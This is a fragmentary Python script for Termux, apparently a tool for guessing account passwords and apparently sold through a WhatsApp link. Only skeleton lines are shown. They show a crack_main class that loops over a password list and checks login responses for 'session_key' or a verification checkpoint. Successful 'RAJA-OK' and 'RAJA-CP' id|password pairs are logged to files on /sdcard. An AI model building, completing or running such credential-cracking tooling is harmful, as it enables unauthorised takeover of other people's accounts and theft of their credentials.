...
def qsbuy():
	...
	try:
		...
		try:
			...
			os.system(f"termux-open-url https://wa.me/+923097526691?text={bumper}")
...
class crack_main():
	...
	def m1(self,iid,name,passlist):
		...
		try:
			...
			sys.stdout.write('\r[RAJA] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
			...
			for pw in passlist:
				...
				if 'session_key' in po:
					...
					print(' \033[1;32m[RAJA-OK] '+roid+' | '+pas+'\033[0;97m')

					open('/sdcard/Raja_ok.txt','a').write(roid+'|'+pas+'\n')
				...
				if 'User must verify their account' in po:
					...
					try:
						...
						print(' \033[1;31m[RAJA-CP] '+roid+' | '+pas+'\033[0;97m')

						open('/sdcard/Raja_cp.txt','a').write(roid+'|'+pas+'\n')
	...
	def pasw(self):
		...
		print(' Ok Ids Save In : /sdcard/Raja_ok.txt')
...
def double():
	...
	try:
		...
		print(' \n\033[1;97mExample: /sdcard/Raja.txt\n\033[0;97m')
